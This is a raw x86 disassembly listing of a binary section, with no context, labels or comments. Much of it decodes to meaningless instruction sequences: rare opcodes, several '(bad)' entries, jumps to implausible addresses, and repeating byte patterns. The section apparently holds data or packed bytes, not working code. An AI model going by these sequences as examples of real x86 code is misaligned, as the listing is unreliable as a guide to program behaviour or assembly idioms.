  402f5e:	mov    BYTE PTR [ebx+0x12],ah
  402f61:	outs   dx,BYTE PTR ds:[esi]
  402f62:	adc    DWORD PTR [edi+eax*2-0x7d],edi
  402f66:	test   al,0x4f
  402f68:	cld    
  402f69:	push   esp
  402f6a:	inc    esp
  402f6b:	pshufw mm0,QWORD PTR [eax+0x62],0x58
  402f70:	inc    ecx
  402f71:	add    eax,0x40404340
  402f76:	inc    ebx
  402f77:	inc    eax
  402f78:	test   BYTE PTR [eax],al
  402f7a:	add    eax,0x40624041
  402f7f:	inc    eax
  402f80:	add    BYTE PTR [edx+0x5],ah
  402f83:	inc    ebx
  402f84:	add    BYTE PTR [eax+0x78],al
  402f87:	inc    ecx
  402f88:	add    BYTE PTR [eax+0x41],bl
  402f8b:	bound  ecx,QWORD PTR [ecx]
  402f8d:	arpl   WORD PTR [eax-0x58],ax
  402f90:	push   ebp
  402f91:	push   eax
  402f92:	pcmpeqw mm0,QWORD PTR ds:0xdd517f93
  402f99:	or     al,0x93
  402f9b:	inc    eax
  402f9c:	imul   esp,DWORD PTR [edx+0x28],0xffffff97
  402fa0:	ror    bl,0x37
  402fa3:	arpl   WORD PTR [ecx-0x7acbf3c],ax
  402fa9:	dec    eax
  402faa:	cld    
  402fab:	inc    eax
  402fac:	push   eax
  402fad:	dec    edi
  402fae:	add    DWORD PTR [edi+0x7af0007f],edi
  402fb4:	add    DWORD PTR [eax-0x7c],0x562cc00
  402fbb:	inc    ecx
  402fbc:	je     0x4040738e
  402fc2:	add    BYTE PTR [eax+0x40],al
  402fc5:	inc    eax
  402fc6:	int3   
  402fc7:	add    BYTE PTR ds:0x62404341,al
  402fcd:	pop    eax
  402fce:	add    BYTE PTR [ebx+0x40],al
  402fd1:	bound  ecx,QWORD PTR [edi]
  402fd3:	inc    eax
  402fd4:	dec    esp
  402fd5:	stos   DWORD PTR es:[edi],eax
  402fd6:	mov    edi,0xe0f547d0
  402fdb:	or     ebp,DWORD PTR [edx]
  402fdd:	sub    BYTE PTR [edi+0x54708563],bh
  402fe3:	adc    DWORD PTR [esi-0xff4bbd8],0xa54bff5c
  402fed:	imul   ecx,ebp,0x4c8f67dc
  402ff3:	or     DWORD PTR [eax+0x4a544247],ebp
  402ff9:	cmp    dl,BYTE PTR [edi+edi*8+0x48]
  402ffd:	jg     0x402fba
  402fff:	cmp    eax,0x67658ce4
  403004:	inc    ecx
  403005:	and    BYTE PTR [eax],al
  403007:	add    BYTE PTR [eax+0x40],al
  40300a:	cmovno eax,DWORD PTR ds:0x40056243
  403011:	int3   
  403012:	add    ah,cl
  403014:	inc    eax
  403015:	inc    eax
  403016:	bound  eax,QWORD PTR [ecx+0x0]
  403019:	add    BYTE PTR [edi],cl
  40301b:	inc    ebx
  40301c:	inc    eax
  40301d:	inc    eax
  40301e:	add    BYTE PTR [ecx+0x43],al
  403021:	add    eax,0x40256240
  403026:	bound  eax,QWORD PTR [eax]
  403028:	pushf  
  403029:	ret    
  40302a:	push   es
  40302b:	cmp    BYTE PTR [ecx+eax*1+0x2d],al
  40302f:	shl    DWORD PTR [edx+0x70],0x8c
  403033:	inc    edx
  403034:	sar    DWORD PTR [esp+ebx*8-0x34],1
  403038:	dec    ecx
  403039:	and    esp,DWORD PTR [esp+esi*2+0x4d]
  40303d:	add    DWORD PTR [eax+0x68],esi
  403040:	adc    al,0x4d
  403042:	pop    edx
  403043:	mov    ebx,esp
  403045:	dec    esp
  403046:	xor    BYTE PTR [eax-0x5ac3c7ae],ch
  40304c:	bound  eax,QWORD PTR [edx]
  40304e:	push   ebp
  40304f:	inc    edi
  403050:	fild   DWORD PTR ds:0x60403d4c
  403056:	add    eax,0x4140cc00
  40305b:	inc    eax
  40305c:	inc    ebx
  40305d:	bound  esp,QWORD PTR ds:0x41400043
  403063:	add    BYTE PTR [eax],al
  403065:	add    eax,0x43624062
  40306a:	inc    ecx
  40306b:	inc    eax
  40306c:	inc    eax
  40306d:	inc    eax
  40306e:	add    eax,0x40624340
  403073:	add    eax,0x40664140
  403078:	sub    al,0x2a
  40307a:	les    ebp,FWORD PTR [eax+0x457d7e08]
  403080:	push   0xcb104f41
  403085:	jbe    0x40301f
  403087:	add    eax,0xb0400a80
  40308c:	dec    eax
  40308d:	les    eax,FWORD PTR [ecx+0x71]
  403090:	jae    0x403102
  403092:	test   BYTE PTR [ecx+0x5],al
  403095:	out    dx,eax
  403096:	cmc    
  403097:	add    dl,BYTE PTR [ecx+0x42553d62]
  40309d:	std    
  40309e:	pusha  
  40309f:	and    DWORD PTR [edi+0x41fcc340],edi
  4030a5:	stos   DWORD PTR es:[edi],eax
  4030a6:	push   ecx
  4030a7:	pop    ebp
  4030a8:	sbb    BYTE PTR [edx],ch
  4030aa:	test   BYTE PTR [esi+0x3c],al
  4030ad:	mov    bl,0x41
  4030af:	add    DWORD PTR [eax],ecx
  4030b1:	xlat   BYTE PTR ds:[ebx]
  4030b2:	add    eax,0x437e20
  4030b7:	add    eax,0x41107840
  4030bc:	bound  eax,QWORD PTR [eax+0x40]
  4030bf:	sldt   WORD PTR [eax-0x34]
  4030c3:	js     0x403127
  4030c5:	add    eax,0x40664143
  4030ca:	inc    ebx
  4030cb:	add    BYTE PTR [ecx+0x5],al
  4030ce:	js     0x403110
  4030d0:	bound  eax,QWORD PTR [eax+0x0]
  4030d3:	inc    eax
  4030d4:	call   0xbf0bde49
  4030d9:	leave  
  4030da:	int3   
  4030db:	(bad)  
  4030dc:	int    0x24
  4030de:	addr16 mov edi,0x4fdc44ac
  4030e4:	cmp    eax,0xcbbec249
  4030e9:	dec    eax
  4030ea:	jle    0x40312c
  4030ec:	inc    ebx
  4030ed:	push   edx
  4030ee:	sub    eax,0xc921596
  4030f3:	inc    esp
  4030f4:	ja     0x403172
  4030f6:	sub    DWORD PTR [ebp+0x3a62c41a],esi
  4030fc:	loope  0x403152
  4030fe:	lds    ebp,FWORD PTR [eax-0x3cea9c79]
  403104:	fs mov ebp,0x3065bf0d
  40310a:	test   al,0x4c
  40310c:	mov    ch,0x56
  40310e:	enter  0x412a,0x43
  403112:	inc    eax
  403113:	inc    eax
  403114:	add    eax,0x434162
  403119:	inc    eax
  40311a:	add    BYTE PTR [edx+0x5],ah
  40311d:	inc    eax
  40311e:	adc    BYTE PTR [edx+0x40],ah
  403121:	inc    ebx
  403122:	inc    ecx
  403123:	add    eax,0x4340
  403128:	add    eax,0x404162
  40312d:	add    BYTE PTR [eax+0x43],al
  403130:	inc    eax
  403131:	add    eax,0x11659880
  403136:	pop    ecx
  403137:	push   ecx
  403138:	sub    ecx,DWORD PTR [ebx+0x73]
  40313b:	fnstsw WORD PTR ds:0xe8ab01cb
  403141:	jge    0x4030d3
  403143:	arpl   WORD PTR [ecx-0x3ebb18b8],cx
  403149:	push   eax
  40314a:	mov    edi,0x3a0dd1c0
  40314f:	mov    bh,0x53
  403151:	bound  eax,QWORD PTR [eax+0x1c]
  403154:	addr16 dec ecx
  403156:	fiadd  WORD PTR [eax-0x3f]
  403159:	mov    ds:0x4bbc5a40,eax
  40315e:	mov    al,0x54
  403160:	ror    BYTE PTR [esi+0x40],cl
  403163:	cmp    BYTE PTR [ecx+0x40],dh
  403166:	add    BYTE PTR [eax],al
  403168:	inc    ecx
  403169:	inc    ebx
  40316a:	add    eax,0x41784062
  40316f:	inc    eax
  403170:	inc    eax
  403171:	add    BYTE PTR [edi],cl
  403173:	bound  eax,QWORD PTR [ebx+0x0]
  403176:	add    eax,0x25006240
  40317b:	inc    eax
  40317c:	add    eax,0x40254143
  403181:	add    eax,0x38620000
  403186:	mov    al,0x70
  403188:	shr    DWORD PTR [eax+0xeef58dc],0x57
  40318f:	inc    eax
  403190:	not    DWORD PTR [eax-0x3bc39d40]
  403196:	stos   DWORD PTR es:[edi],eax
  403197:	push   eax
  403198:	inc    esp
  403199:	inc    ecx
  40319a:	inc    esi
  40319b:	dec    eax
  40319c:	inc    ebx
  40319d:	add    BYTE PTR [eax],al
  40319f:	add    BYTE PTR [ecx+0x40],al
  4031a2:	bound  esp,QWORD PTR [esi+0x0]
  4031a5:	inc    eax
  4031a6:	add    eax,0x5400000
  4031ab:	inc    ecx
  4031ac:	inc    eax
  4031ad:	inc    eax
  4031ae:	bound  esp,QWORD PTR ds:0x25050043
  4031b4:	inc    ecx
  4031b5:	inc    ebx
  4031b6:	inc    eax
  4031b7:	test   BYTE PTR [eax+0x0],al
  4031ba:	bound  ebx,QWORD PTR [eax+0x62]
  4031bd:	inc    ecx
  4031be:	inc    eax
  4031bf:	fisttp DWORD PTR [edi-0x56]
  4031c2:	js     0x403185
  4031c4:	dec    ebx
  4031c5:	inc    ebx
  4031c6:	and    al,0x28
  4031c8:	or     BYTE PTR [ebp+0x34ec5d44],0xe5
  4031cf:	sbb    al,0xc5
  4031d1:	(bad)  
  4031d2:	stc    
  4031d3:	ret    
  4031d4:	push   ebx
  4031d5:	push   ecx
  4031d6:	bound  eax,QWORD PTR [eax-0xba82b0]
  4031dc:	dec    ecx
  4031dd:	test   al,0x47
  4031df:	bound  eax,QWORD PTR [ebx-0x4c]
  4031e2:	fadd   st,st(3)
  4031e4:	les    ebp,FWORD PTR ds:0xfe664554
  4031ea:	jno    0x403200
  4031ec:	dec    ebx
  4031ed:	xor    ch,BYTE PTR [eax-0x69a9c344]
  4031f3:	ret    0xbba8
  4031f6:	adc    al,BYTE PTR [ecx-0x44]
  4031f9:	ror    BYTE PTR [ecx+0x2f],0x10
  4031fd:	bound  eax,QWORD PTR [eax+0x41]
  403200:	and    eax,0x40000500
  403205:	inc    ebx
  403206:	add    eax,0x40624041
  40320b:	inc    ebx
  40320c:	add    eax,0x43402541
  403211:	bound  eax,QWORD PTR [eax+0x43]
  403214:	int3   
  403215:	inc    eax
  403216:	bound  eax,QWORD PTR [eax]
  403218:	inc    ecx
  403219:	inc    eax
  40321a:	inc    eax
  40321b:	add    eax,0xece84105
  403220:	pusha  
  403221:	cmp    ah,ch
  403223:	ror    DWORD PTR [esi+0x2a],1
  403226:	test   al,0x42
  403228:	pop    ecx
  403229:	test   al,0x1d
  40322b:	pop    esp
  40322c:	ror    BYTE PTR [eax-0x54],0x16
  403230:	sub    al,0x10
  403232:	pop    edx
  403233:	shl    BYTE PTR [eax+0x42],1
  403236:	retf   
  403237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403238:	add    al,0x64
  40323a:	repz sub DWORD PTR [eax-0xb],eax
  40323e:	adc    eax,0x9b021054
  403243:	dec    ecx
  403244:	rol    BYTE PTR [ebx+eax*2+0x40],0x48
  403249:	retf   
  40324a:	adc    eax,0x6f63b5f1
  40324f:	inc    eax
  403250:	and    al,BYTE PTR [eax+eax*2+0x57]
  403254:	sub    al,0x25
  403256:	pop    esp
  403257:	inc    ecx
  403258:	hlt    
  403259:	bound  eax,QWORD PTR [eax+0x25]
  40325c:	add    BYTE PTR [esi+0x40],ah
  40325f:	add    eax,0x40404143
  403264:	inc    ebx
  403265:	add    BYTE PTR [eax],al
  403267:	add    BYTE PTR [edx-0x34],ah
  40326a:	inc    eax
  40326b:	add    eax,0x40004041
  403270:	inc    ecx
  403271:	int3   
  403272:	add    BYTE PTR [ebx-0x7c],al
  403275:	add    eax,0x5406240
  40327a:	bound  ebp,QWORD PTR [ebp+ebx*8-0x6f]
  40327e:	je     0x403228
  403280:	bound  ebx,QWORD PTR [eax+0x709b2ca8]
  403286:	ret    
  403287:	inc    eax
  403288:	call   0xdda84451
  40328d:	push   ecx
  40328e:	imul   eax,DWORD PTR [ecx],0x8484f05
  403294:	int3   
  403295:	dec    esp
  403296:	mov    BYTE PTR [edx],0xcb
  403299:	inc    ebx
  40329a:	inc    ecx
  40329b:	retf   
  40329c:	push   cs
  40329d:	adc    ebp,DWORD PTR [eax+edx*1-0x6e]
  4032a1:	inc    ecx
  4032a2:	int    0x58
  4032a4:	out    0x50,eax
  4032a6:	shr    BYTE PTR [eax],1
  4032a8:	inc    ecx
  4032a9:	int3   
  4032aa:	loopne 0x4032d7
  4032ac:	cs xchg ecx,eax
  4032ae:	rol    DWORD PTR [eax-0x3d],0xf8
  4032b2:	bound  ecx,QWORD PTR [eax+0x30]
  4032b5:	inc    eax
  4032b6:	bound  ebx,QWORD PTR [eax+0x41]
  4032b9:	add    eax,0x40404340
  4032be:	inc    ebx
  4032bf:	inc    eax
  4032c0:	test   BYTE PTR [eax],al
  4032c2:	add    eax,0x40624041
  4032c7:	inc    eax
  4032c8:	add    BYTE PTR [edx+0x5],ah
  4032cb:	inc    ebx
  4032cc:	add    BYTE PTR [eax+0x78],al
  4032cf:	inc    ecx
  4032d0:	add    BYTE PTR [eax+0x41],bl
  4032d3:	bound  ebx,QWORD PTR [edi-0x3cdfd504]
  4032d9:	add    BYTE PTR gs:[ebx+0x4c],0xc1
  4032de:	inc    esi
  4032df:	fs mov edi,0x7bbbc36c
  4032e5:	push   esi
  4032e6:	ins    DWORD PTR es:[edi],dx
  4032e7:	sar    BYTE PTR [edi+0x56e74c62],1
  4032ed:	rcl    DWORD PTR [eax+0x41b81343],0x45
  4032f4:	push   ecx
  4032f5:	in     eax,dx
  4032f6:	bound  ebp,QWORD PTR [esi]
  4032f8:	inc    eax
  4032f9:	test   BYTE PTR [eax],al
  4032fb:	int3   
  4032fc:	bound  eax,QWORD PTR ds:0xcc840f41
  403302:	inc    ebx
  403303:	add    BYTE PTR [eax+0x0],al
  403306:	inc    eax
  403307:	inc    eax
  403308:	inc    eax
  403309:	int3   
  40330a:	add    BYTE PTR ds:0x62404341,al
  403310:	pop    eax
  403311:	add    BYTE PTR [ebx+0x40],al
  403314:	bound  ecx,QWORD PTR [edi]
  403316:	inc    eax
  403317:	dec    esi
  403318:	adc    eax,0xc2465279
  40331d:	outs   dx,DWORD PTR fs:[esi]
  40331f:	test   al,0xc9
  403321:	mov    dl,cl
  403323:	push   ecx
  403324:	das    
  403325:	and    al,0xa8
  403327:	inc    esp
  403328:	mov    ah,0x80
  40332a:	push   esi
  40332b:	dec    esp
  40332c:	cmp    DWORD PTR [ebp+0x11],eax
  40332f:	ins    DWORD PTR es:[edi],dx
  403330:	inc    ecx
  403331:	ret    
  403332:	add    BYTE PTR [eax],al
  403334:	inc    eax
  403335:	inc    eax
  403336:	cmovno eax,DWORD PTR ds:0x40056243
  40333d:	int3   
  40333e:	add    ah,cl
  403340:	inc    eax
  403341:	inc    eax
  403342:	bound  eax,QWORD PTR [ecx+0x0]
  403345:	add    BYTE PTR [edi],cl
  403347:	inc    ebx
  403348:	inc    eax
  403349:	inc    eax
  40334a:	add    BYTE PTR [ecx+0x43],al
  40334d:	add    eax,0x40256240
  403352:	bound  eax,QWORD PTR [eax]
  403354:	sbb    DWORD PTR cs:[esi-0x79],edx
  403358:	clc    
  403359:	and    al,0x46
  40335b:	dec    esp
  40335c:	and    BYTE PTR [ebx-0x40],al
  40335f:	dec    edx
  403360:	inc    ecx
  403361:	push   ebx
  403362:	cld    
  403363:	js     0x4032e5
  403365:	fwait
  403366:	and    dh,BYTE PTR ds:0xdf6e0577
  40336c:	xchg   ebx,eax
  40336d:	inc    ecx
  40336e:	out    0x41,eax
  403370:	and    BYTE PTR [edi-0x29beeeb4],al
  403376:	rcr    DWORD PTR [edi+0x44],0x6e
  40337a:	jne    0x403398
  40337c:	add    eax,0x4140cc00
  403381:	inc    eax
  403382:	inc    ebx
  403383:	bound  esp,QWORD PTR ds:0x41400043
  403389:	add    BYTE PTR [eax],al
  40338b:	add    eax,0x43624062
  403390:	inc    ecx
  403391:	inc    eax
  403392:	inc    eax
  403393:	inc    eax
  403394:	add    eax,0x40624340
  403399:	add    eax,0x40664140
  40339e:	adc    esi,DWORD PTR [ebx+0x58]
  4033a1:	and    BYTE PTR [edx+eiz*8-0x23],dl
  4033a5:	bound  esp,QWORD PTR [ecx+eax*2]
  4033a8:	sar    BYTE PTR [esi-0x3bf39ac7],0xf7
  4033af:	shl    BYTE PTR [esi],1
  4033b1:	pop    ds
  4033b2:	scas   al,BYTE PTR es:[edi]
  4033b3:	cmp    BYTE PTR [eax],0x4f
  4033b6:	sub    al,0xbd
  4033b8:	imul   ebp,DWORD PTR [eax+0x40655d8d],0x432766
  4033c2:	add    eax,0x41107840
  4033c7:	bound  eax,QWORD PTR [eax+0x40]
  4033ca:	sldt   WORD PTR [eax-0x34]
  4033ce:	js     0x403432
  4033d0:	add    eax,0x40664143
  4033d5:	inc    ebx
  4033d6:	add    BYTE PTR [ecx+0x5],al
  4033d9:	js     0x40341b
  4033db:	bound  eax,QWORD PTR [eax+0x0]
  4033de:	inc    eax
  4033df:	ret    0xa804
  4033e2:	leave  
  4033e3:	adc    DWORD PTR [eax+0x3432df3e],ebx
  4033e9:	adc    BYTE PTR [eax-0xb35c2c8],al
  4033ef:	sbb    al,BYTE PTR [edx-0x4c]
  4033f2:	inc    esi
  4033f3:	jne    0x4033b8
  4033f5:	inc    ebx
  4033f6:	and    al,0x4e
  4033f8:	arpl   WORD PTR [edx-0x4b],ax
  4033fb:	cmp    al,0x4c
  4033fd:	push   ebp
  4033fe:	popa   
  4033ff:	shl    BYTE PTR [eax],0x99
  403402:	inc    ecx
  403403:	inc    ebx
  403404:	inc    eax
  403405:	inc    eax
  403406:	add    eax,0x434162
  40340b:	inc    eax
  40340c:	add    BYTE PTR [edx+0x5],ah
  40340f:	inc    eax
  403410:	adc    BYTE PTR [edx+0x40],ah
  403413:	inc    ebx
  403414:	inc    ecx
  403415:	add    eax,0x4340
  40341a:	add    eax,0x404162
  40341f:	add    BYTE PTR [eax+0x43],al
  403422:	inc    eax
  403423:	add    eax,0x9a08a8fe
  403428:	push   ecx
  403429:	pusha  
  40342a:	xchg   edi,eax
  40342b:	push   esp
  40342c:	or     eax,0x42aec930
  403431:	les    ecx,FWORD PTR [eax]
  403433:	bound  edi,QWORD PTR ds:0x71489800
  403439:	sar    DWORD PTR [edi+0xd945e18],0xc5
  403440:	xor    bl,al
  403442:	ds cmp esp,edi
  403445:	(bad)  [eax+0x40]
  403448:	add    BYTE PTR [eax],al
  40344a:	inc    ecx
  40344b:	inc    ebx
  40344c:	add    eax,0x41784062
  403451:	inc    eax
  403452:	inc    eax
  403453:	add    BYTE PTR [edi],cl
  403455:	bound  eax,QWORD PTR [ebx+0x0]
  403458:	add    eax,0x25006240
  40345d:	inc    eax
  40345e:	add    eax,0x40254143
  403463:	add    eax,0x4f620000
  403468:	mov    al,0xc1
  40346a:	bound  esi,QWORD PTR [ebp-0x7f874afb]
  403470:	xor    BYTE PTR [edi+0x54],bl
  403473:	bound  ebx,QWORD PTR [eax]
  403475:	test   al,0x28
  403477:	cs or  eax,0x565740c2
  40347d:	adc    BYTE PTR [eax+0x753610a9],bl
  403483:	or     ebx,DWORD PTR [esp+esi*4+0x5]
  403487:	and    ebx,DWORD PTR ds:0xf826976c
  40348d:	inc    edx
  40348e:	leave  
  40348f:	inc    ebx
  403490:	add    BYTE PTR [eax],al
  403492:	add    BYTE PTR [ecx+0x40],al
  403495:	bound  esp,QWORD PTR [esi+0x0]
  403498:	inc    eax
  403499:	add    eax,0x5400000
  40349e:	inc    ecx
  40349f:	inc    eax
  4034a0:	inc    eax
  4034a1:	bound  esp,QWORD PTR ds:0x25050043
  4034a7:	inc    ecx
  4034a8:	inc    ebx
  4034a9:	inc    eax
  4034aa:	test   BYTE PTR [eax+0x0],al
  4034ad:	bound  ebx,QWORD PTR [eax+0x62]
  4034b0:	inc    ecx
  4034b1:	inc    eax
  4034b2:	sar    BYTE PTR [edx-0x3f],cl
  4034b5:	adc    eax,0x4575fac2
  4034ba:	add    BYTE PTR [ebp+eax*1-0x58],al
  4034be:	mov    eax,ds:0x4cffc46
  4034c3:	rol    ah,1
  4034c5:	inc    eax
  4034c6:	stos   DWORD PTR es:[edi],eax
  4034c7:	mul    BYTE PTR [ecx]
  4034c9:	arpl   dx,dx
  4034cb:	xor    al,0xfb
  4034cd:	sub    bl,BYTE PTR [ebx]
  4034cf:	adc    bl,BYTE PTR [edi+0x7a]
  4034d2:	fiadd  DWORD PTR [ecx+0x2c]
  4034d5:	dec    edi
  4034d6:	mov    edx,0x20a83dfa
  4034db:	xor    DWORD PTR [eax+0x36],eax
  4034de:	fs clc 
  4034e0:	jbe    0x40352e
  4034e2:	dec    esi
  4034e3:	inc    esp
  4034e4:	sub    DWORD PTR [ecx-0x27],eax
  4034e7:	or     eax,0x70a62a23
  4034ec:	retf   0x2ab8
  4034ef:	adc    BYTE PTR [edx+0x40],ah
  4034f2:	inc    ecx
  4034f3:	and    eax,0x40000500
  4034f8:	inc    ebx
  4034f9:	add    eax,0x40624041
  4034fe:	inc    ebx
  4034ff:	add    eax,0x43402541
  403504:	bound  eax,QWORD PTR [eax+0x43]
  403507:	int3   
  403508:	inc    eax
  403509:	bound  eax,QWORD PTR [eax]
  40350b:	inc    ecx
  40350c:	inc    eax
  40350d:	inc    eax
  40350e:	add    eax,0x42dcc905
  403513:	fild   WORD PTR [edx-0x3e]
  403516:	ret    
  403517:	mov    ecx,0x14162926
  40351c:	aas    
  40351d:	xor    al,BYTE PTR [edi-0x80]
  403520:	inc    ebx
  403521:	sub    BYTE PTR [eax+0x33c52480],al
  403527:	lds    ebx,FWORD PTR [ebp+0x6d]
  40352a:	bound  ebx,QWORD PTR [esi]
  40352c:	pop    ebx
  40352d:	ret    0x6274
  403530:	inc    eax
  403531:	and    eax,0x5406600
  403536:	inc    ebx
  403537:	inc    ecx
  403538:	inc    eax
  403539:	inc    eax
  40353a:	inc    ebx
  40353b:	add    BYTE PTR [eax],al
  40353d:	add    BYTE PTR [edx-0x34],ah
  403540:	inc    eax
  403541:	add    eax,0x40004041
  403546:	inc    ecx
  403547:	int3   
  403548:	add    BYTE PTR [ebx-0x7c],al
  40354b:	add    eax,0x5406240
  403550:	bound  eax,QWORD PTR [esp+ebp*8+0x42]
  403554:	les    ebp,FWORD PTR [edx+0x4c643911]
  40355a:	push   edx
  40355b:	mov    cs,WORD PTR [edi+0x26]
  40355e:	sbb    eax,0xf93f6470
  403563:	cmp    eax,0xc155f840
  403568:	test   al,0x7d
  40356a:	mul    BYTE PTR [eax+0x68]
  40356d:	adc    eax,DWORD PTR [eax+0x62]
  403570:	pop    eax
  403571:	inc    ecx
  403572:	add    eax,0x40404340
  403577:	inc    ebx
  403578:	inc    eax
  403579:	test   BYTE PTR [eax],al
  40357b:	add    eax,0x40624041
  403580:	inc    eax
  403581:	add    BYTE PTR [edx+0x5],ah
  403584:	inc    ebx
  403585:	add    BYTE PTR [eax+0x78],al
  403588:	inc    ecx
  403589:	add    BYTE PTR [eax+0x41],bl
  40358c:	bound  edx,QWORD PTR [edx+0x55a1255]
  403592:	adc    eax,0x757ac041
  403597:	pusha  
  403598:	test   al,0x58
  40359a:	ja     0x4035e1
  40359c:	mov    eax,ds:0x1110c347
  4035a1:	sti    
  4035a2:	sbb    dh,BYTE PTR [ebp*2-0x334e5c8]
  4035a9:	clc    
  4035aa:	bound  eax,QWORD PTR [ebp+edx*1+0x6d]
  4035ae:	sar    DWORD PTR [edi+0x2060f442],0x62
  4035b5:	push   esp
  4035b6:	inc    esp
  4035b7:	mov    edi,0xed6c5692
  4035bc:	cmp    al,0xb1
  4035be:	rol    cl,0x20
  4035c1:	mov    dl,0x40
  4035c3:	test   BYTE PTR [eax],al
  4035c5:	int3   
  4035c6:	bound  eax,QWORD PTR ds:0xcc840f41
  4035cc:	inc    ebx
  4035cd:	add    BYTE PTR [eax+0x0],al
  4035d0:	inc    eax
  4035d1:	inc    eax
  4035d2:	inc    eax
  4035d3:	int3   
  4035d4:	add    BYTE PTR ds:0x62404341,al
  4035da:	pop    eax
  4035db:	add    BYTE PTR [ebx+0x40],al
  4035de:	bound  ecx,QWORD PTR [edi]
  4035e0:	inc    eax
  4035e1:	sub    esp,eax
  4035e3:	push   0x62ad21da
  4035e8:	repnz dec eax
  4035ea:	dec    edi
  4035eb:	add    eax,0x52a855b4
  4035f0:	or     eax,0x22af4043
  4035f5:	ret    0x2cf9
  4035f8:	sbb    BYTE PTR [ecx],dh
  4035fa:	fs push eax
  4035fc:	inc    ebx
  4035fd:	and    al,0xab
  4035ff:	mov    edi,0x6e390156
  403604:	xor    DWORD PTR [ebx],esi
  403606:	dec    edx
  403607:	mov    edi,0x4000005c
  40360c:	inc    eax
  40360d:	cmovno eax,DWORD PTR ds:0x40056243
  403614:	int3   
  403615:	add    ah,cl
  403617:	inc    eax
  403618:	inc    eax
  403619:	bound  eax,QWORD PTR [ecx+0x0]
  40361c:	add    BYTE PTR [edi],cl
  40361e:	inc    ebx
  40361f:	inc    eax
  403620:	inc    eax
  403621:	add    BYTE PTR [ecx+0x43],al
  403624:	add    eax,0x40256240
  403629:	bound  eax,QWORD PTR [eax]
  40362b:	test   al,0x43
  40362d:	nop
  40362e:	in     eax,dx
  40362f:	ror    DWORD PTR [edx+0x6],0xf9
  403633:	adc    BYTE PTR [edi+0x42],bh
  403636:	dec    ebp
  403637:	push   esi
  403638:	fmul   st,st(1)
  40363a:	lock pop esp
  40363c:	sub    BYTE PTR ds:0xa87bc2d1,ah
  403642:	adc    DWORD PTR ds:0xabe47c91,eax
  403648:	test   DWORD PTR [eax+0xa],0xb1c738cb
  40364f:	pusha  
  403650:	test   al,0x40
  403652:	pop    esi
  403653:	dec    ebp
  403654:	scas   al,BYTE PTR es:[di]
  403656:	jle    0x403682
  403658:	adc    DWORD PTR [ebx-0x12],esp
  40365b:	stos   DWORD PTR es:[edi],eax
  40365c:	mov    al,ds:0x5704a
  403661:	int3   
  403662:	inc    eax
  403663:	inc    ecx
  403664:	inc    eax
  403665:	inc    ebx
  403666:	bound  esp,QWORD PTR ds:0x41400043
  40366c:	add    BYTE PTR [eax],al
  40366e:	add    eax,0x43624062
  403673:	inc    ecx
  403674:	inc    eax
  403675:	inc    eax
  403676:	inc    eax
  403677:	add    eax,0x40624340
  40367c:	add    eax,0x40664140
  403681:	ret    0x1e48
  403684:	adc    eax,0x7a0a6345
  403689:	xor    eax,0x7754a8cb
  40368e:	jg     0x4036e2
  403690:	je     0x4036d5
  403692:	mov    eax,0x3c5cca47
  403697:	cwde   
  403698:	xchg   ecx,eax
  403699:	rol    BYTE PTR ds:0x44631947,0x43
  4036a0:	dec    esi
  4036a1:	inc    ebx
  4036a2:	add    BYTE PTR ds:0x41107840,al
  4036a8:	bound  eax,QWORD PTR [eax+0x40]
  4036ab:	sldt   WORD PTR [eax-0x34]
  4036af:	js     0x403713
  4036b1:	add    eax,0x40664143
  4036b6:	inc    ebx
  4036b7:	add    BYTE PTR [ecx+0x5],al
  4036ba:	js     0x4036fc
  4036bc:	bound  eax,QWORD PTR [eax+0x0]
  4036bf:	inc    eax
  4036c0:	and    eax,DWORD PTR [ebp-0x4]
  4036c3:	cli    
  4036c4:	pop    esp
  4036c5:	mov    BYTE PTR ds:0x264b2c91,0xec
  4036cc:	or     eax,0xc042657e
  4036d1:	fsub   DWORD PTR [ebx]
  4036d3:	or     eax,0xd2d01ecb
  4036d8:	xor    bh,BYTE PTR [edx*8+0x43414a41]
  4036df:	inc    eax
  4036e0:	inc    eax
  4036e1:	add    eax,0x434162
  4036e6:	inc    eax
  4036e7:	add    BYTE PTR [edx+0x5],ah
  4036ea:	inc    eax
  4036eb:	adc    BYTE PTR [edx+0x40],ah
  4036ee:	inc    ebx
  4036ef:	inc    ecx
  4036f0:	add    eax,0x4340
  4036f5:	add    eax,0x404162
  4036fa:	add    BYTE PTR [eax+0x43],al
  4036fd:	inc    eax
  4036fe:	add    eax,0x752be762
  403703:	mov    ah,0x62
  403705:	adc    DWORD PTR [ecx+eax*2],esi
  403708:	stos   BYTE PTR es:[edi],al
  403709:	scas   al,BYTE PTR es:[edi]
  40370a:	shl    DWORD PTR [ebx+0x47],0x40
  40370e:	inc    eax
  40370f:	xor    BYTE PTR [ebx],cl
  403711:	or     DWORD PTR ds:0x5c5c9c88,edx
  403717:	mov    cs,edi
  403719:	shr    DWORD PTR [ebx],1
  40371b:	inc    ecx
  40371c:	push   edx
  40371d:	stc    
  40371e:	cmp    eax,0xc14017c4
  403723:	cmp    DWORD PTR [eax+0x41000040],ebp
  403729:	inc    ebx
  40372a:	add    eax,0x41784062
  40372f:	inc    eax
  403730:	inc    eax
  403731:	add    BYTE PTR [edi],cl
  403733:	bound  eax,QWORD PTR [ebx+0x0]
  403736:	add    eax,0x25006240
  40373b:	inc    eax
  40373c:	add    eax,0x40254143
  403741:	add    eax,0x44620000
  403746:	ret    
  403747:	dec    edi
  403748:	rol    BYTE PTR cs:[esp+ebp*2+0x62],1
  40374d:	inc    esi
  40374e:	nop
  40374f:	inc    eax
  403750:	leave  
  403751:	pusha  
  403752:	rcr    DWORD PTR [eax+0x72],0xda
  403756:	mov    edi,0x6142e960
  40375b:	xor    eax,0x3a402d62
  403760:	dec    ecx
  403761:	hlt    
  403762:	ret    
  403763:	dec    ebx
  403764:	inc    eax
  403765:	test   al,0x49
  403767:	ret    
  403768:	adc    DWORD PTR [edx],esp
  40376a:	push   edi
  40376b:	cmp    al,BYTE PTR [eax+0x10]
  40376e:	inc    esp
  40376f:	mov    esp,0x43
  403774:	inc    ecx
  403775:	inc    eax
  403776:	bound  esp,QWORD PTR [esi+0x0]
  403779:	inc    eax
  40377a:	add    eax,0x5400000
  40377f:	inc    ecx
  403780:	inc    eax
  403781:	inc    eax
  403782:	bound  esp,QWORD PTR ds:0x25050043
  403788:	inc    ecx
  403789:	inc    ebx
  40378a:	inc    eax
  40378b:	test   BYTE PTR [eax+0x0],al
  40378e:	bound  ebx,QWORD PTR [eax+0x62]
  403791:	inc    ecx
  403792:	inc    eax
  403793:	sar    DWORD PTR [edi-0x3b],1
